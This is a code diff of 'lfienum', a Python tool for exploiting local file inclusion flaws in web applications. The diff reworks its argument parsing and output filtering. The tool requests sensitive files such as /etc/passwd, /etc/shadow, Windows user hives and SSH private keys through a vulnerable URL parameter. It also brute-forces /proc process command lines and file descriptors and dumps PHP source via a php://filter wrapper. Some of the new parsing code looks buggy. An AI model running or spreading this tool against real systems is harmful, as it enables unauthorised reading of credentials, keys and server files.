@@ -27,19 +27,23 @@ def Help():
 	print ("Last positional argument:\n")
 	print ("    -vvv                       Show package info")
 	print ("    --only-url                 Dump urls only")
+	print ("    -x1                        Use XCF_A function print all text between tags (default)")
+	print ("    -x2                        Use XCF_B function print all text that isn't between any tag")
+	print ("    -x3                        Use XCF_C function print content between specific tag")
+	print ("    -x4                        Use XCF_D function delete all content inside <html> and </html> tags")
 
 def AdHelp():
 
 	print ("\nExamples:\n")
 	print ('[Default scan]\n')
 	print ('    python3 lfienum "http://ghost.server/index.php?page="')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" -vvv')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --only-url')
+	print ('    python3 lfienum "http://ghost.server/index.php?page=" -x2')
+	print ('    python3 lfienum "http://ghost.server/index.php?page=" --only-url -x3')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --only-url -vvv\n')
 	print ('[Bruteforece process id]\n')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 857')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 259 -vvv')
+	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 259 -x4')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 325 --only-url')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 8492 --only-url -vvv\n')	
 	print ('[Single process id]\n')
@@ -49,38 +53,40 @@ def AdHelp():
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pid 6234 --only-url -vvv\n')
 	print ('[Bruteforce File Descriptors]\n')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 56')
+	print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 56 -x2')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 622 -vvv')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 842 --only-url')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 5654 --only-url -vvv\n')
 	print ('[Wrapper]\n')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper index.php')
+	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper index.php -x3')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper /etc/passwd -vvv')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper db.php --only-url')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper login.php --only-url -vvv\n')
 	print ('[Wordlist]\n')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt -vvv')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt --only-url')
+	print ('    python3 lfienum "http://ghost.server/index.php?page=" -w wordlist.txt')
+	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt -vvv -x2')
+	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt --only-url -x3')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt --only-url -vvv\n')
 	print ('[ID RSA]\n')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --key')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --key -vvv')
+	print ('    python3 lfienum "http://ghost.server/index.php?page=" -k')
+	print ('    python3 lfienum "http://ghost.server/index.php?page=" -k -x2')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --key --only-url')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --key --only-url -vvv\n')
+
+if '-h' in sys.argv or '--help' in sys.argv:
+
+	Help()
+	sys.exit(1)
+		
+if '-ah' in sys.argv or '--advanced-help' in sys.argv:
 	
+	Help()
+	AdHelp()
+	sys.exit(1)
+
 try:
 
-	if sys.argv[1] == '--help' or sys.argv[1] == '-h':
-
-		Help()
-		sys.exit(1)
-		
-	if sys.argv[1] == '--advanced-help' or sys.argv[1] == '-ah':
-	
-		Help()
-		AdHelp()
-		sys.exit(1)
+	url = sys.argv[1]
 
 except IndexError:
 
@@ -92,14 +98,86 @@ headers = {
     'User-Agent': '--'
 }
 
-try:
+def CheckCon():
 
-	url = sys.argv[1]
+	try:
 
-except IndexError:
+		check_con = requests.get(url, headers=headers, timeout=10)
 
-	Help()
-	sys.exit(1)
+	except requests.exceptions.ConnectTimeout:
+
+		print ('Connection timed out.')
+		sys.exit(1)
+	
+	except requests.exceptions.ConnectionError:	
+
+		print ('Failed to establish a new connection: [Errno -2] Name or service not known')
+		sys.exit(1)
+
+	except requests.exceptions.MissingSchema:
+
+		print ("Invalid URL '" + url + "': No scheme supplied.")
+		sys.exit(1)
+
+def XCF_A():                  # this function aims to print all text between tags (default)
+
+	global clean_content
+	content = resp.text
+	out = re.sub('<[^<]+?>', '', content)			
+	clean_content = out.strip()
+
+def XCF_B():                  # this function aims to print all text that isn't between any tag
+
+	global clean_content
+	content = resp.text
+	out = re.sub('<[^<].*>', '', content)
+	clean_content = out.strip()
+
+def XCF_C():                  # this function aims to print content between specific tags
+
+	global clean_content
+	soup = BeautifulSoup(resp.content, 'html.parser')
+	clean_content = soup.find_all('p')[0].text.strip()
+	#for i in soup.find_all(["p"]):
+		#clean_content = i.text
+
+def XCF_D():                  # this function aims to delete all content inside <html> & </html> tags 
+	
+	global clean_content
+	soup = BeautifulSoup(resp.content, 'html.parser')
+	for i in soup.find_all('html'):
+		i.decompose()   # same as i.replaceWith('')
+	clean_content = soup.get_text().strip()
+
+def PackageStatus():
+
+	print ('[Response Code]:', resp.status_code)
+	print ('[Content Lenght]:', len(clean_content))
+	lines = 0
+	for i in clean_content:
+		if i == '\n':
+			lines += 1
+	print ('[Content Lines]:', lines+1, '\n')
+	
+only_url=False
+package_status=False
+if '-vvv' in sys.argv:
+
+	package_status=True
+	
+if '--only-url' in sys.argv:
+
+	only_url=True
+
+XCF = XCF_A
+if '-x1' in sys.argv:
+	XCF = XCF_A
+if '-x2' in sys.argv:
+	XCF = XCF_B
+if '-x3' in sys.argv:
+	XCF = XCF_C
+if '-x4' in sys.argv:
+	XCF = XCF_D
 
 linux_lfi_wordlist=['/etc/passwd',
 '/etc/shadow',
@@ -1200,38 +1278,6 @@ windows_lfi_wordlist=['C:/Users/Administrator/NTUser.dat',
 'c:/WINDOWS/system32/Macromed/Flash/FlashInstall.log',
 'c:/WINDOWS/system32/Macromed/Flash/install.log']
 
-def XCF():                  # this function aims to print all text between tags (default)
-
-	global clean_content
-	content = resp.text
-	out = re.sub('<[^<]+?>', '', content)			
-	clean_content = out.strip()
-
-#def XCF():                 # this function aims to print content between specific tags with the objective to avoid unwanted data
-
-#	global clean_content
-#	soup = BeautifulSoup(resp.content, 'html.parser')
-#	for i in soup.find_all(["p"]):
-#		clean_content = i.text
-
-#def XCF():                  # this function aims to delete all content between <html> & </html> tags and will print text after </html> tag with the objective to get last losing text 
-	
-#	global clean_content
-#	soup = BeautifulSoup(resp.content, 'html.parser')
-#	for i in soup.find_all('html'):
-#		i.decompose()   # same as i.replaceWith('')
-#	clean_content = soup.get_text().strip()
-	
-def PackageStatus():
-
-	print ('[Response Code]:', resp.status_code)
-	print ('[Content Lenght]:', len(clean_content))
-	lines = 0
-	for i in clean_content:
-		if i == '\n':
-			lines += 1
-	print ('[Content Lines]:', lines+1, '\n')
-
 def LinEnum():
 
 	for possible_lfi_file in linux_lfi_wordlist:
@@ -1277,40 +1323,37 @@ def WinEnum():
 				if only_url == False:		
 				
 					print(clean_content)
-
-def PID():
-
-	pid = int(sys.argv[3])
-	global resp
-	resp = requests.get(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
-
-	if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
-
-		XCF()
-
-		if len(clean_content) > 0:
-
-			if only_url == False:
-
-				print (ColGreenMark + "PID " + str(pid) + ":" + ColEnd + " " + clean_content.strip())
-
-			if only_url == True:
-				
-				print (ColGreenMark + "> " + url + '/proc/' + str(pid) + '/cmdline' + ColEnd)
-
-			if package_status == True:
 	
-				PackageStatus()
+def Wordlist():
+
+	with open(wordlist, 'r') as custom_wordlist:
+
+		for possible_lfi_file in custom_wordlist:
+
+			global resp
+			resp = requests.get(url + possible_lfi_file.strip(), verify=True, headers=headers, allow_redirects=False)
+
+			if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
+
+				XCF()
+
+				if len(clean_content) > 0:
+
+					print (ColGreenMark + "> " + url + possible_lfi_file.strip() + ColEnd)
+					
+					if package_status == True:
+	
+						PackageStatus()
+						
+					if only_url == False:
+					
+						print (clean_content)
 
 def PIDS():
 
 	try:
 	
-		pid_count=int(sys.argv[3])
-	
-	except IndexError:
-	
-		pid_count=999
+		pid_count=int(pids_x)
 		
 	except ValueError:
 	
@@ -1340,15 +1383,35 @@ def PIDS():
 	
 					PackageStatus()
 
+def PID():
+
+	pid = int(pid_x)
+	global resp
+	resp = requests.get(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
+
+	if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
+
+		XCF()
+
+		if len(clean_content) > 0:
+
+			if only_url == False:
+
+				print (ColGreenMark + "PID " + str(pid) + ":" + ColEnd + " " + clean_content.strip())
+
+			if only_url == True:
+				
+				print (ColGreenMark + "> " + url + '/proc/' + str(pid) + '/cmdline' + ColEnd)
+
+			if package_status == True:
+	
+				PackageStatus()
+
 def FD():
 
 	try:
 
-		fd_count=int(sys.argv[3])
-		
-	except IndexError:
-	
-		fd_count=30
+		fd_count=int(fd_x)
 		
 	except ValueError:
 
@@ -1379,7 +1442,7 @@ def FD():
 def Wrapper():
 
 	global resp
-	resp = requests.get(url + 'php://filter/convert.base64-encode/resource=' + sys.argv[3], verify=True, headers=headers, allow_redirects=False)
+	resp = requests.get(url + 'php://filter/convert.base64-encode/resource=' + wrap_x, verify=True, headers=headers, allow_redirects=False)
 	
 	XCF()
 	
@@ -1437,155 +1500,140 @@ def IdRSA():
 					
 						print (clean_content)
 
-def Wordlist():
 
-	with open(sys.argv[3], 'r') as custom_wordlist:
+def Main():
 
-		for possible_lfi_file in custom_wordlist:
+	if '-h' in sys.argv or '--help' in sys.argv:
 
-			global resp
-			resp = requests.get(url + possible_lfi_file.strip(), verify=True, headers=headers, allow_redirects=False)
-
-			if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
-
-				XCF()
-
-				if len(clean_content) > 0:
-
-					print (ColGreenMark + "> " + url + possible_lfi_file.strip() + ColEnd)
-					
-					if package_status == True:
+		Help()
+		sys.exit(1)
+		
+	if '-ah' in sys.argv or '--advanced-help' in sys.argv:
 	
-						PackageStatus()
-						
-					if only_url == False:
-					
-						print (clean_content)
-def CheckCon():
+		Help()
+		AdHelp()
+		sys.exit(1)
 
+	parser = []
+	for arg in sys.argv:
+		parser.append(arg)
+
+		if '-w' == arg or '--worldist' == arg:
+		
+			wordlistp = int(parser.index(arg)+1)
+		
+		if '--fd' == arg:	
+			
+			fdp = int(parser.index(arg)+1)
+    		
+		if '--pids' == arg:	
+			
+			pidsp = int(parser.index(arg)+1)
+			
+		if '--pid' == arg:	
+			
+			pidp = int(parser.index(arg)+1)
+			
+		if '--wrapper' == arg:	
+			
+			wrapperp = int(parser.index(arg)+1)
+			
+		if '-k' == arg or '--key' == arg:	
+			
+			keyp = True
+	
+	global wordlist
+	global fd_x
+	global pids_x
+	global pid_x
+	global wrap_x
+	global key_x
+	
 	try:
-
-		check_con = requests.get(url, headers=headers, timeout=10)
-
-	except requests.exceptions.ConnectTimeout:
-
-		print ('Connection timed out.')
-		sys.exit(1)
-	
-	except requests.exceptions.ConnectionError:	
-
-		print ('Failed to establish a new connection: [Errno -2] Name or service not known')
-		sys.exit(1)
-
-	except requests.exceptions.MissingSchema:
-
-		print ("Invalid URL '" + url + "': No scheme supplied. Perhaps you meant http://" + url + "?")
-		sys.exit(1)
-
-CheckCon()
-
-only_url=False
-package_status=False
-if '-vvv' in sys.argv:
-
-	package_status=True
-	
-if '--only-url' in sys.argv:
-
-	only_url=True
-
-# Args handlers
-if len(sys.argv) == 2 or len(sys.argv) == 3 and '-vvv' in sys.argv or len(sys.argv) == 3 and '--only-url' in sys.argv or len(sys.argv) == 4 and '--only-url' in sys.argv and '-vvv' in sys.argv:
-
-	try:
-	
-		LinEnum()
-		IdRSA()
+		if 'http' in sys.argv[1] and not '--pids' in sys.argv and not '--pid' in sys.argv and not '--fd' in sys.argv and not '--wrapper' in sys.argv and not '-w' in sys.argv and not '--wordlist' in sys.argv and not '-k' in sys.argv and not '--key' in sys.argv:
+			LinEnum()
+			IdRSA()
+			WinEnum()
 
 	except:
-		
+	
 		sys.exit(1)
+	
+	try:
+		if keyp == True:
+	
+			key_x = parser[keyp]
+			IdRSA()
+	
+	except UnboundLocalError:
+		pass
 
 	try:
+		wrap_x = parser[wrapperp]
+		Wrapper()
+	
+	except IndexError:
 
-		WinEnum()
-			
-	except:
-
+		print ("wrapper argument usage example:")
+		print ("python3 lfienum http://ghost.server/index.php?page= --wrapper index.php")
 		sys.exit(1)
-
-	sys.exit(1)
-
-try:
-
-	if sys.argv[2] == '--key' or sys.argv[2] == '-k':
 		
-		IdRSA()
-
-except:
-
-	sys.exit(1)
-
-try:
-
-	if sys.argv[2] == '--wordlist' or sys.argv[2] == '-w':
-		
-		try:
-		
-			Wordlist()
-
-		except FileNotFoundError:
-		
-			print ('[Errno 2] No such file or directory: ' + sys.argv[3])
-			
-
-except IndexError:
-
-	print ("wordlist usage example:")
-	print ("python3 lfienum http://ghost.server/index.php?page= --wordlist wordlist.txt")
-	sys.exit(1)
-
-try:
-
-	if sys.argv[2] == "--pid":
-		
+	except UnboundLocalError:
+		pass
+	
+	try:
+		pid_x = parser[pidp]
 		PID()
-
-except IndexError:
-
-	print ("single pid usage:")
-	print ('python3 lfienum "http://ghost.server/index.php?page=" --pid 1')
-	sys.exit(1)
-
-try:
-
-	if sys.argv[2] == "--pids":
+	
+	except (IndexError,ValueError):
+	
+		print ("single pid usage:")
+		print ('python3 lfienum "http://ghost.server/index.php?page=" --pid 1')
+		sys.exit(1)
 		
+	except UnboundLocalError:
+		pass
+	
+	try:
+		pids_x = parser[pidsp]
+		PIDS()
+	
+	except IndexError:
+
+		pids_x = 999
 		PIDS()
 
-except IndexError:
+	except UnboundLocalError:
+		pass
 
-	print ("bruteforce pid's range usage:")
-	print ('python3 lfienum "http://ghost.server/index.php?page=" --pids 999')
-	sys.exit(1)
-
-try:
-
-	if sys.argv[2] == "--fd":
-		
+	try:
+		fd_x = parser[fdp]
 		FD()
+	
+	except IndexError:
+	
+		fd_x=30
+		FD()		
 
-except IndexError:
+	except UnboundLocalError:
+		pass
 
-	sys.exit(1)
-
-try:
-	if sys.argv[2] == '--wrapper':
+	try:
+		wordlist = parser[wordlistp]
+		Wordlist()
+	
+	except FileNotFoundError:
+		print("FileNotFoundError: [Errno 2] No such file or directory: " + "'" + wordlist + "'")
+		sys.exit(1)
 		
-		Wrapper()
+	except IndexError:
+	
+		print ("wordlist usage example:")
+		print ("python3 lfienum http://ghost.server/index.php?page= --wordlist wordlist.txt")
+		sys.exit(1)
+	
+	except UnboundLocalError:
+		pass
 
-except IndexError:
-
-	print ("wrapper argument usage example:")
-	print ("python3 lfienum http://ghost.server/index.php?page= --wrapper index.php")
-	sys.exit(1)
+CheckCon()
+Main()
